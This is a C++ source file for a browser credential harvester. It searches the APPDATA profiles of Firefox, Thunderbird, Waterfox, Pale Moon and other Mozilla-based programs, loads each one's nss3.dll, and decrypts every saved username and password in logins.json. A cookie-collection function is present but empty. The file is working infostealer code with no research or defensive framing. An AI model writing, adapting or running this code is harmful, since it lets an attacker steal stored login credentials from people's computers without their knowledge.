#include "FireFoxParser.h"
#include "cJSON.h"
#include "Base64.h"

#pragma warning(disable:4996)



List<AccountData> FirefoxParser::GetEncryptedAccounts(String profilePath)
{
	List<AccountData> ret;
	String loginFile = profilePath + "\\logins.json";

	ifstream file(loginFile);
	if (!file.is_open())
		return ret;
	std::string content((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));

	cJSON* root = cJSON_Parse(content.c_str());
	if (!root) return ret;

	cJSON* logins = cJSON_GetObjectItem(root, "logins");
	if (!logins) return ret;

	int size = cJSON_GetArraySize(logins);
	for (int i = 0; i < size; i++) {
		cJSON* item = cJSON_GetArrayItem(logins, i);
		if (!item) 
			continue;
		AccountData data;
		cJSON* host = cJSON_GetObjectItem(item, "hostname");
		cJSON* username = cJSON_GetObjectItem(item, "encryptedUsername");
		cJSON* pwd = cJSON_GetObjectItem(item, "encryptedPassword");

		if (!host || !username || !pwd) 
			continue;

		data.Url = host->valuestring;
		data.Username = username->valuestring;
		data.Password = pwd->valuestring;

		ret.push_back(data);
	}

	return ret;
}

List<String> FirefoxParser::GetProfileDirs(String mozPath)
{
	String profileDir = mozPath + "\\Profiles";
	List<String> ret;

	if (!fs::is_directory(profileDir)) 
		return ret;
	
	for (const auto& subdir : fs::directory_iterator(profileDir)) {
		if (fs::is_directory(subdir)) {
			String subdirPath = subdir.path().string();
			
			String loginFile = subdirPath + "\\logins.json";
			String keyFile = subdirPath + "\\key4.db";
			String sqliteFile = subdirPath + "\\places.sqlite";

			if (fs::exists(loginFile) && fs::exists(keyFile) && fs::exists(sqliteFile))
				ret.push_back(subdirPath);
		}
	}
	return ret;
}

String FirefoxParser::Decrypt(Pk11SdrDecrypt* m_ipNssPk11SdrDecrypt, String txt)
{
	vector<BYTE> decBytes = base64_decryptor::base64_decode(txt);
	SECItem in, out;
	out.len = 0;
	in.type = SECItemType::siBuffer;
	in.data = decBytes.data();
	in.len = decBytes.size();

	if (m_ipNssPk11SdrDecrypt(&in, &out, NULL) == 0) {
		out.data[out.len] = 0;
		return String((char*)out.data);
	}
		
	return String();
}

String FirefoxParser::GetAppDir(String profileDir)
{
	const String iniFile = profileDir + "\\compatibility.ini";

	std::ifstream file(iniFile);
	String sign = "LastPlatformDir=";

	if (file.is_open()) {
		std::string line;
		while (getline(file, line)) {
			if (line.starts_with(sign)) {
				line.replace(line.find(sign), sign.size(), "");
				file.close();
				return line;
			}
		}
		file.close();
	}

	return String();
}

FirefoxParser::FirefoxParser()
{
	path_list = {
		R"(\Mozilla\Firefox)", 
		R"(\Waterfox)", 
		R"(\K-Meleon)", 
		R"(\Thunderbird)", 
		R"(\Comodo\IceDragon)",
		R"(\8pecxstudios\Cyberfox)", 
		R"(\NETGATE Technologies\BlackHaw)", 
		R"(\Moonchild Productions\Pale Moon)"
	};
}

List<AccountData> FirefoxParser::CollectAccounts()
{
	List<AccountData> retData = List<AccountData>();
	String localAppDataPath = getenv("APPDATA");

	for (const auto& relativePath : path_list)
	{
		String mozillaDir = localAppDataPath + relativePath;
		if (!fs::exists(mozillaDir) || !fs::is_directory(mozillaDir)) continue;
		
		List<String> profielDirs = GetProfileDirs(mozillaDir);

		for (const auto& profielDir : profielDirs)
		{
			String appDir = GetAppDir(profielDir);
			if (appDir.empty())
				continue;
			String mozglue_dll_path = appDir + "\\mozglue.dll";
			String nss_3_dll_path = appDir + "\\nss3.dll";
			bool r = fs::exists(mozglue_dll_path);
			HMODULE m_hMozGlue = LoadLibraryA(mozglue_dll_path.c_str());
			HMODULE m_hNss3 = LoadLibraryA(nss_3_dll_path.c_str());

			if (!m_hMozGlue || !m_hNss3) 
				continue;

			NssInit* m_NssInit = reinterpret_cast<NssInit*>(GetProcAddress(m_hNss3, "NSS_Init"));
			Pk11SdrDecrypt* m_ipNssPk11SdrDecrypt = reinterpret_cast<Pk11SdrDecrypt*>(GetProcAddress(m_hNss3, "PK11SDR_Decrypt"));
			NssShutdown* m_NssShutdown = reinterpret_cast<NssShutdown*>(GetProcAddress(m_hNss3, "NSS_Shutdown"));
			if (!m_NssInit || !m_ipNssPk11SdrDecrypt || !m_NssShutdown) 
				continue;

			m_NssInit((char*)profielDir.c_str());

			List<AccountData> acs = GetEncryptedAccounts(profielDir);

			for (AccountData& ac : acs) {
				ac.Username = Decrypt(m_ipNssPk11SdrDecrypt, ac.Username);
				ac.Password = Decrypt(m_ipNssPk11SdrDecrypt, ac.Password);
				if (!ac.Url.empty() && !ac.Username.empty() && !ac.Password.empty()) {
					retData.push_back(ac);
				}
			}

			m_NssShutdown();
			FreeLibrary(m_hNss3);
			FreeLibrary(m_hMozGlue);
		}
	}
	return retData;
}

List<CookieData> FirefoxParser::CollectCookie()
{
	return List<CookieData>();
}
